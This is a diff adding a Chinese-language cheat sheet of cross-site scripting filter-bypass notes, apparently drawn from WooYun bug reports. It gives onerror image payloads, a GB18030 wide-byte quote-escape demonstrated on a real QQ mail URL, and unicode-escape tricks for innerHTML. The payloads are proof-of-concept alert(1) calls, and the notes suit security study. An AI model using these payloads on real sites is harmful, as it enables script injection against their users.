@@ -1,0 +1,70 @@
+
+http://www.wooyun.org/whitehats/%E5%BF%83%E4%BC%A4%E7%9A%84%E7%98%A6%E5%AD%90
+
+
+判断过滤<>
+<img src=1>
+
+onerror 事件
+onerror 事件会在文档或图像加载过程中发生错误时被触发。
+在装载文档或图像的过程中如果发生了错误，就会调用该事件句柄。
+支持该事件的 HTML 标签：
+<img>, <object>, <style>
+支持该事件的 JavaScript 对象：
+window, image
+
+例：<img src=1 onerror=alert(1);>  <img src="image.gif" onerror="alert('The image could not be loaded.')" />  <img src="1" onerror="alert&#x28;1&#x29;">    
+//引用的图片不存在，所有弹出一个提示框
+
+
+过滤"时
+看到  <meta http-equiv="Content-Type" content="text/html; charset=gb18030" />  尝试使用宽字节%c0%22; 来闭合 //  %c0可以吃掉%5c    %5c => \
+测试方法：%c0%22heihei
+
+例：http://open.mail.qq.com/cgi-bin/qm_help_mailme?sid=,2,zh_CN&t=    %c0%22;alert(1);//aaaaaa
+
+
+
+凡是以 function xxx(){} 形式定义的函数，都会被最优先解析,解析器在解析JS代码段时，会先将 function xxx(){} 拿到最前面解析，然后再依次解析其它的部分
+
+http://www.wooyun.org/bugs/wooyun-2010-015979
+
+可运用 \闭合后面"
+空格转移可用/**/代替
+输出在【注释】的情况，注意运用换行符%0
+注意代码优先级
+
+jS的字符串中的字符可以写为 unicode编码。运用转码 例：document.getElementById("a").innerHTML="\u003cimg src=1\u003e";
+注意是否输出在aa.innerHTML="xxxxxxxxxxxx"; 利用<img src=1 onerror=alert(1)> 触发XSS,IE下，可以使用 <script defer>alert(1)</script>。 
+
+常用unicode代码  http://app.baidu.com/app/enter?appid=280383    也可使用base 16
+空格 \u0020
+/  \u002f
+\  \u005c
+<  \u003c
+=  \u003d
+>  \u003e
+
+
+http://www.wooyun.org/bugs/wooyun-2010-016150
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
